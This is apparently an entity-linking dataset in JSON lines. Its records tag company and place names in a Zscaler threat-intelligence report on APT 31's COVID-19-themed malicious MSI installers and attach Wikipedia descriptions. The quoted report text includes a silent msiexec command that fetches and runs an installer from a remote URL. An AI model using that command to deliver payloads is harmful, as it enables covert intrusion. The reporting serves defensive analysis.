{"mention": "Zscaler's", "context_left": "October 27, 2020 Recently,", "context_right": "ThreatLabZ team discovered several malicious MSI installer binaries that were hosted on attacker-controlled GitHub accounts and distributed in-the-wild in August 2020. These MSI binaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social engineering technique.", "_context_left": "Recently, ", "_context_right": " ThreatLabZ team discovered several malicious MSI installer binaries that were hosted on attacker-controlled GitHub accounts and distributed in-the-wild in August 2020.", "sentence_left": "October 27, 2020", "sentence_right": "These MSI binaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social engineering technique.", "label": "Zscaler ((US English)) is a cloud security company, with headquarters in San Jose, California. It offers a platform for businesses that move their data to the cloud, with employees who work remotely.", "label_id": 5903536, "label_title": "Zscaler", "label_link": "https://en.wikipedia.org/wiki?curid=65138718", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "GitHub", "context_left": "October 27, 2020 Recently, Zscaler's ThreatLabZ team discovered several malicious MSI installer binaries that were hosted on attacker-controlled", "context_right": "accounts and distributed in-the-wild in August 2020. These MSI binaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social engineering technique.", "_context_left": "Recently, Zscaler's ThreatLabZ team discovered several malicious MSI installer binaries that were hosted on attacker-controlled ", "_context_right": " accounts and distributed in-the-wild in August 2020.", "sentence_left": "October 27, 2020", "sentence_right": "These MSI binaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social engineering technique.", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Chinese", "context_left": "These MSI binaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social engineering technique. After further analysis of these MSI binaries, we gathered sufficient intel from the code base and attack flow to correlate it to the", "context_right": "state-sponsored threat actor APT 31. In this blog, we will share details of the attack flow, threat attribution, correlation between various instances of attacks by this threat actor, and an in-depth technical analysis of the payloads involved.", "_context_left": "After further analysis of these MSI binaries, we gathered sufficient intel from the code base and attack flow to correlate it to the ", "_context_right": " state-sponsored threat actor APT 31.", "sentence_left": "These MSI binaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social engineering technique.", "sentence_right": "In this blog, we will share details of the attack flow, threat attribution, correlation between various instances of attacks by this threat actor, and an in-depth technical analysis of the payloads involved.", "label": "Greater China is an informal geographical area that shares commercial and cultural ties with the Han Chinese people, The notion of \"Greater China\" refers to the area that usually encompasses Mainland China, Hong Kong, Macau, and Taiwan in East Asia, places where the majority are culturally and ethnically Han Chinese. Some analysts may also include places which have predominantly ethnic Chinese population such as Singapore. The term can be generalised to encompass \"linkages among regional Chinese communities\".", "label_id": 5903531, "label_title": "China (region)", "label_link": "https://en.wikipedia.org/wiki?curid=50560673", "entity_class": "NE", "entity_type": "LOC", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "GitHub", "context_left": "The infection chain starts with an email in which the victim receives a download link that fetches the first-stage downloader. As we found in our analysis, this first-stage downloader is responsible for fetching a malicious MSI file hosted on an attacker-controlled", "context_right": "page. This MSI file is downloaded and executed on the endpoint.", "_context_left": "As we found in our analysis, this first-stage downloader is responsible for fetching a malicious MSI file hosted on an attacker-controlled ", "_context_right": " page.", "sentence_left": "The infection chain starts with an email in which the victim receives a download link that fetches the first-stage downloader.", "sentence_right": "This MSI file is downloaded and executed on the endpoint.", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Microsoft", "context_left": "As a result, a malicious Python-compiled binary is dropped on the file system, which uses the Dropbox API for command-and-control (C&C) communication. Based on the metadata of the dropped binary, we observed that attackers were spoofing legitimate application names related to popular online services such as", "context_right": "OneDrive. While we did not obtain the first-stage downloader for this attack, we were able to reconstruct the attack flow based on the tactics, techniques, and procedures (TTPs) used by this threat actor in the past with a similar attack flow.", "_context_left": "Based on the metadata of the dropped binary, we observed that attackers were spoofing legitimate application names related to popular online services such as ", "_context_right": " OneDrive.", "sentence_left": "As a result, a malicious Python-compiled binary is dropped on the file system, which uses the Dropbox API for command-and-control (C&C) communication.", "sentence_right": "While we did not obtain the first-stage downloader for this attack, we were able to reconstruct the attack flow based on the tactics, techniques, and procedures (TTPs) used by this threat actor in the past with a similar attack flow.", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "GitHub", "context_left": "* The attack flow is similar in all cases. * The use of legitimate attacker-controlled", "context_right": "accounts to host malicious MSI files with spoofed file extensions. * The use of Dropbox API for command-and-control (C&C) communication.", "_context_left": "* The use of legitimate attacker-controlled ", "_context_right": " accounts to host malicious MSI files with spoofed file extensions.", "sentence_left": "* The attack flow is similar in all cases.", "sentence_right": "* The use of Dropbox API for command-and-control (C&C) communication.", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "MSI", "context_left": "* The use of Dropbox API for command-and-control (C&C) communication. * The MSI wrapper used to convert the EXE to", "context_right": "file format. * PyInstaller used to compile the Python script to the final payload.", "_context_left": "* The MSI wrapper used to convert the EXE to ", "_context_right": " file format.", "sentence_left": "* The use of Dropbox API for command-and-control (C&C) communication.", "sentence_right": "* PyInstaller used to compile the Python script to the final payload.", "label": "Micro-Star International Co., Ltd (MSi; ) is a Taiwanese multinational information technology corporation headquartered in New Taipei City, Taiwan. It designs, develops and provides computer hardware, related products and services, including laptops, desktops, motherboards, graphics cards, All-in-One PCs, servers, industrial computers, PC peripherals, car infotainment products, etc.  The company has a primary listing on the Taiwan Stock Exchange and was established in August 1986 by 5 founders – Hsu Xiang (a.k.a. Joseph Hsu), Huang Jinqing (a.k.a. Jeans Huang), Lin Wentong (a.k.a. Frank Lin), Yu Xian'neng (a.k.a. Kenny Yu), and Lu Qilong (a.k.a. Henry Lu). First starting its business in New Taipei City, Taiwan, MSI later expanded into Mainland China, setting up its Baoan Plant in Shenzhen in 2000 and establishing research and development facilities in Kunshan in 2001. It also provides global warranty service in North America, Central/South America, Asia, Australia and Europe.  The company has been a sponsor for a number of eSports teams and is also the host of the international gaming event MSI Masters Gaming Arena (formerly known as MSI Beat IT). The earliest Beat IT tournament can be traced back to 2010, featuring Evil Geniuses winning the championship. The company's slogan as seen in 2017 is \"TRUE GAMING. SOME ARE PC, WE ARE GAMING.\"", "label_id": 311667, "label_title": "Micro-Star International", "label_link": "https://en.wikipedia.org/wiki?curid=941245", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Google", "context_left": "* The name of artifacts such as Windows Run registry key used to create persistence on the machine. In October 2020,", "context_right": "’s Threat Analysis Group (TAG) attributed an attack using a similar payload to APT-31 in its report [here](https://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats). While Google’s report did not share any technical analysis details for the payload, we were able to correlate the codebase to the Python-compiled binary highlighted by them.", "_context_left": "In October 2020, ", "_context_right": "’s Threat Analysis Group (TAG) attributed an attack using a similar payload to APT-31 in its report [here](https://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats).", "sentence_left": "* The name of artifacts such as Windows Run registry key used to create persistence on the machine.", "sentence_right": "While Google’s report did not share any technical analysis details for the payload, we were able to correlate the codebase to the Python-compiled binary highlighted by them.", "label": "Google LLC is an American multinational technology company that specializes in Internet-related services and products, which include online advertising technologies, search engine, cloud computing, software, and hardware. It is considered one of the Big Four technology companies, alongside Amazon, Apple and Facebook.  Google was founded in 1998 by Larry Page and Sergey Brin while they were Ph.D. students at Stanford University in California. Together they own about 14 percent of its shares and control 56 percent of the stockholder voting power through supervoting stock. They incorporated Google as a privately held company on September 4, 1998. An initial public offering (IPO) took place on August 19, 2004, and Google moved to its headquarters in Mountain View, California, nicknamed the Googleplex. In August 2015, Google announced plans to reorganize its various interests as a conglomerate called Alphabet Inc. Google is Alphabet's leading subsidiary and will continue to be the umbrella company for Alphabet's Internet interests. Sundar Pichai was appointed CEO of Google, replacing Larry Page who became the CEO of Alphabet.  The company's rapid growth since incorporation has triggered a chain of products, acquisitions, and partnerships beyond Google's core search engine (Google Search). It offers services designed for work and productivity (Google Docs, Google Sheets, and Google Slides), email (Gmail/Inbox), scheduling and time management (Google Calendar), cloud storage (Google Drive), instant messaging and video chat (Google Allo, Duo, Hangouts), language translation (Google Translate), mapping and navigation (Google Maps, Waze, Google Earth, Street View), video sharing (YouTube), note-taking (Google Keep), and photo organizing and editing", "label_id": 348100, "label_title": "Google", "label_link": "https://en.wikipedia.org/wiki?curid=1092923", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Google", "context_left": "In October 2020, Google’s Threat Analysis Group (TAG) attributed an attack using a similar payload to APT-31 in its report [here](https://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats). While", "context_right": "’s report did not share any technical analysis details for the payload, we were able to correlate the codebase to the Python-compiled binary highlighted by them. All the indicators mentioned above were shared by the samples in our report.", "_context_left": "While ", "_context_right": "’s report did not share any technical analysis details for the payload, we were able to correlate the codebase to the Python-compiled binary highlighted by them.", "sentence_left": "In October 2020, Google’s Threat Analysis Group (TAG) attributed an attack using a similar payload to APT-31 in its report [here](https://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats).", "sentence_right": "All the indicators mentioned above were shared by the samples in our report.", "label": "Google LLC is an American multinational technology company that specializes in Internet-related services and products, which include online advertising technologies, search engine, cloud computing, software, and hardware. It is considered one of the Big Four technology companies, alongside Amazon, Apple and Facebook.  Google was founded in 1998 by Larry Page and Sergey Brin while they were Ph.D. students at Stanford University in California. Together they own about 14 percent of its shares and control 56 percent of the stockholder voting power through supervoting stock. They incorporated Google as a privately held company on September 4, 1998. An initial public offering (IPO) took place on August 19, 2004, and Google moved to its headquarters in Mountain View, California, nicknamed the Googleplex. In August 2015, Google announced plans to reorganize its various interests as a conglomerate called Alphabet Inc. Google is Alphabet's leading subsidiary and will continue to be the umbrella company for Alphabet's Internet interests. Sundar Pichai was appointed CEO of Google, replacing Larry Page who became the CEO of Alphabet.  The company's rapid growth since incorporation has triggered a chain of products, acquisitions, and partnerships beyond Google's core search engine (Google Search). It offers services designed for work and productivity (Google Docs, Google Sheets, and Google Slides), email (Gmail/Inbox), scheduling and time management (Google Calendar), cloud storage (Google Drive), instant messaging and video chat (Google Allo, Duo, Hangouts), language translation (Google Translate), mapping and navigation (Google Maps, Waze, Google Earth, Street View), video sharing (YouTube), note-taking (Google Keep), and photo organizing and editing", "label_id": 348100, "label_title": "Google", "label_link": "https://en.wikipedia.org/wiki?curid=1092923", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Hong Kong", "context_left": "All the indicators mentioned above were shared by the samples in our report. Upon further research, we discovered a [report](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/) of an attack using", "context_right": "pro-democracy protest themes in October 2019. There is considerable overlap between the malware distribution strategy and the payload indicators in this report and the samples we discovered.", "_context_left": "Upon further research, we discovered a [report](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/) of an attack using ", "_context_right": " pro-democracy protest themes in October 2019.", "sentence_left": "All the indicators mentioned above were shared by the samples in our report.", "sentence_right": "There is considerable overlap between the malware distribution strategy and the payload indicators in this report and the samples we discovered.", "label": "Hong Kong (; , ), officially the Hong Kong Special Administrative Region of the People's Republic of China, is a special administrative region on the eastern side of the Pearl River estuary in southern China. With over 7.4 million people of various nationalities in a territory, Hong Kong is one of the most densely populated places in the world.  Hong Kong became a colony of the British Empire at the end of the First Opium War in 1842. Sovereignty over the territory was transferred to China in 1997. As a special administrative region, Hong Kong maintains governing and economic systems that are separate from those of mainland China. Its people tend to identify as Hongkongers rather than Chinese.  Originally a sparsely populated area of farming and fishing villages, the territory has become one of the world's most significant financial centres and commercial ports. It was estimated to be the world's tenth-largest exporter, ninth-largest importer, and seventh-largest trading entity, and its legal tender (the Hong Kong dollar) is the world's 13th-most traded currency. Hong Kong hosts the largest concentration of ultra high-net-worth individuals of any city in the world. Although the city has one of the highest per capita incomes in the world, there is severe income inequality.  Hong Kong is classified as an alpha+ world city, indicating its influence throughout the world. Hong Kong is one of the most significant global financial centres, holding the highest Financial Development Index score and consistently ranking as the most competitive and freest economic area in", "label_id": 6386, "label_title": "Hong Kong", "label_link": "https://en.wikipedia.org/wiki?curid=13404", "entity_class": "NE", "entity_type": "LOC", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "New Zealand government", "context_left": "**Decoy Filename**: PAPER-COVID-19-Vaccine-Strategy.pdf Figure 2 shows the contents of this decoy document, which discusses a COVID-19 vaccine strategy specifically for", "context_right": "authorities. Threat actors obtained the original source of this document [here](https://covid19.govt.nz/assets/resources/proactive-release-2020-june/PAPER-COVID-19-Vaccine-Strategy.pdf).", "_context_left": "Figure 2 shows the contents of this decoy document, which discusses a COVID-19 vaccine strategy specifically for ", "_context_right": " authorities.", "sentence_left": "**Decoy Filename**: PAPER-COVID-19-Vaccine-Strategy.pdf", "sentence_right": "Threat actors obtained the original source of this document [here](https://covid19.govt.nz/assets/resources/proactive-release-2020-june/PAPER-COVID-19-Vaccine-Strategy.pdf).", "label": "The Government of New Zealand (), or New Zealand Government (ceremonially referred to as \"Her Majesty's Government in New Zealand\" on the Seal of New Zealand), is the administrative complex through which authority is exercised in New Zealand. As in most parliamentary democracies, the term \"Government\" refers chiefly to the executive branch, and more specifically to the collective ministry directing the executive (as in British usage, but where Americans would use \"administration\"). Based on the principle of responsible government, it operates within the framework that \"the Queen reigns, but the government rules, so long as it has the support of the House of Representatives\".  Executive power is exercised by ministers, all of whom are sworn into the Executive Council and accountable to the elected legislature, the House of Representatives. Several senior ministers (usually around 20) constitute a collective decision-making body known as the Cabinet, which is led by the Prime Minister (currently Jacinda Ardern). A few more ministers (usually junior or supporting) are part of the Executive Council but outside Cabinet. Most ministers have a portfolio of specific responsibilities such as departments or policy areas, although ministers without portfolio are sometimes appointed.  The position of prime minister belongs to the person who commands the support of a majority of members in the House of Representatives. The position is determined also by several other factors, such as support agreements between parties and internal leadership votes in the party that leads the Government. The prime minister and other ministers are \"formally\" appointed by the governor-general", "label_id": 1420071, "label_title": "Government of New Zealand", "label_link": "https://en.wikipedia.org/wiki?curid=8899161", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "New Zealand government's", "context_left": "![decoy_1x](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/decoy_1x.png) *Figure 2: Decoy document related to the", "context_right": "COVID-19 vaccine strategy*  **MD5 hash of MSI file:** f3896d4a29b4a2ea14ea8a7e2e500ee5", "_context_left": "*Figure 2: Decoy document related to the ", "_context_right": " COVID-19 vaccine strategy* ", "sentence_left": "![decoy_1x](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/decoy_1x.png)", "sentence_right": "**MD5 hash of MSI file:** f3896d4a29b4a2ea14ea8a7e2e500ee5", "label": "The Government of New Zealand (), or New Zealand Government (ceremonially referred to as \"Her Majesty's Government in New Zealand\" on the Seal of New Zealand), is the administrative complex through which authority is exercised in New Zealand. As in most parliamentary democracies, the term \"Government\" refers chiefly to the executive branch, and more specifically to the collective ministry directing the executive (as in British usage, but where Americans would use \"administration\"). Based on the principle of responsible government, it operates within the framework that \"the Queen reigns, but the government rules, so long as it has the support of the House of Representatives\".  Executive power is exercised by ministers, all of whom are sworn into the Executive Council and accountable to the elected legislature, the House of Representatives. Several senior ministers (usually around 20) constitute a collective decision-making body known as the Cabinet, which is led by the Prime Minister (currently Jacinda Ardern). A few more ministers (usually junior or supporting) are part of the Executive Council but outside Cabinet. Most ministers have a portfolio of specific responsibilities such as departments or policy areas, although ministers without portfolio are sometimes appointed.  The position of prime minister belongs to the person who commands the support of a majority of members in the House of Representatives. The position is determined also by several other factors, such as support agreements between parties and internal leadership votes in the party that leads the Government. The prime minister and other ministers are \"formally\" appointed by the governor-general", "label_id": 1420071, "label_title": "Government of New Zealand", "label_link": "https://en.wikipedia.org/wiki?curid=8899161", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "John Hopkins Bloomberg School of Public Health", "context_left": "**Decoy filename**: 200709-The-Publics-Role-in-COVID-19-Vaccination.pdf Figure 5 shows the contents of a document that pretends to be from a working group involving", "context_right": "and Texas State Anthropology discussing the public’s role in the COVID-19 vaccination. ![Decoy_4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/decoy_4.png)", "_context_left": "Figure 5 shows the contents of a document that pretends to be from a working group involving ", "_context_right": " and Texas State Anthropology discussing the public’s role in the COVID-19 vaccination.", "sentence_left": "**Decoy filename**: 200709-The-Publics-Role-in-COVID-19-Vaccination.pdf", "sentence_right": "![Decoy_4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/decoy_4.png)", "label": "The Johns Hopkins Bloomberg School of Public Health (JHSPH) is part of Johns Hopkins University in Baltimore, Maryland, United States. As the first independent, degree-granting institution for research in epidemiology and training in public health, and the largest public health training facility in the United States, the Bloomberg School is a leading international authority on the improvement of health and prevention of disease and disability. The school's mission is to protect populations from illness and injury by pioneering new research, deploying its knowledge and expertise in the field, and training scientists and practitioners in the global defense of human life. The school is ranked first in public health in the \"U.S. News and World Report\" rankings and has held that ranking since 1994.", "label_id": 512977, "label_title": "Johns Hopkins Bloomberg School of Public Health", "label_link": "https://en.wikipedia.org/wiki?curid=1877646", "entity_class": "NE", "entity_type": "SECTOR", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Microsoft", "context_left": "For the purpose of technical analysis, we will consider the MSI file with MD5 hash: **f3896d4a29b4a2ea14ea8a7e2e500ee5** MSI is an installer package file format used by", "context_right": "Windows. Microsoft Windows provides an *msiexec* utility that provides the means to install, modify, and perform operations on MSI files.", "_context_left": "MSI is an installer package file format used by ", "_context_right": " Windows.", "sentence_left": "For the purpose of technical analysis, we will consider the MSI file with MD5 hash: **f3896d4a29b4a2ea14ea8a7e2e500ee5**", "sentence_right": "Microsoft Windows provides an *msiexec* utility that provides the means to install, modify, and perform operations on MSI files.", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Microsoft", "context_left": "MSI is an installer package file format used by Microsoft Windows.", "context_right": "Windows provides an *msiexec* utility that provides the means to install, modify, and perform operations on MSI files. The threat actor in this case hosted the MSI file on GitHub using a spoofed file extension to look like a PDF.", "_context_left": "", "_context_right": " Windows provides an *msiexec* utility that provides the means to install, modify, and perform operations on MSI files.", "sentence_left": "MSI is an installer package file format used by Microsoft Windows.", "sentence_right": "The threat actor in this case hosted the MSI file on GitHub using a spoofed file extension to look like a PDF.", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "GitHub", "context_left": "Microsoft Windows provides an *msiexec* utility that provides the means to install, modify, and perform operations on MSI files. The threat actor in this case hosted the MSI file on", "context_right": "using a spoofed file extension to look like a PDF. Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor from previous tactics, techniques, and procedures (TTPs) in the [report](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/), we concluded that there was a first-stage payload involved that was used to fetch the MSI file from GitHub and execute it using the msiexec.exe command-line utility.", "_context_left": "The threat actor in this case hosted the MSI file on ", "_context_right": " using a spoofed file extension to look like a PDF.", "sentence_left": "Microsoft Windows provides an *msiexec* utility that provides the means to install, modify, and perform operations on MSI files.", "sentence_right": "Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor from previous tactics, techniques, and procedures (TTPs) in the [report](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/), we concluded that there was a first-stage payload involved that was used to fetch the MSI file from GitHub and execute it using the msiexec.exe command-line utility.", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "GitHub", "context_left": "The threat actor in this case hosted the MSI file on GitHub using a spoofed file extension to look like a PDF. Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor from previous tactics, techniques, and procedures (TTPs) in the [report](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/), we concluded that there was a first-stage payload involved that was used to fetch the MSI file from", "context_right": "and execute it using the msiexec.exe command-line utility. In this threat actor's 2019 activity, an LNK file was used to fetch the MSI binary from GitHub and execute it using the following command line:", "_context_left": "Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor from previous tactics, techniques, and procedures (TTPs) in the [report](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/), we concluded that there was a first-stage payload involved that was used to fetch the MSI file from ", "_context_right": " and execute it using the msiexec.exe command-line utility.", "sentence_left": "The threat actor in this case hosted the MSI file on GitHub using a spoofed file extension to look like a PDF.", "sentence_right": "In this threat actor's 2019 activity, an LNK file was used to fetch the MSI binary from GitHub and execute it using the following command line:", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "GitHub", "context_left": "Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor from previous tactics, techniques, and procedures (TTPs) in the [report](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/), we concluded that there was a first-stage payload involved that was used to fetch the MSI file from GitHub and execute it using the msiexec.exe command-line utility. In this threat actor's 2019 activity, an LNK file was used to fetch the MSI binary from", "context_right": "and execute it using the following command line: *C:\\Windows\\System32\\msiexec.exe  /q /i <github\\_URL>*", "_context_left": "In this threat actor's 2019 activity, an LNK file was used to fetch the MSI binary from ", "_context_right": " and execute it using the following command line:", "sentence_left": "Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor from previous tactics, techniques, and procedures (TTPs) in the [report](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/), we concluded that there was a first-stage payload involved that was used to fetch the MSI file from GitHub and execute it using the msiexec.exe command-line utility.", "sentence_right": "*C:\\Windows\\System32\\msiexec.exe  /q /i <github\\_URL>*", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": 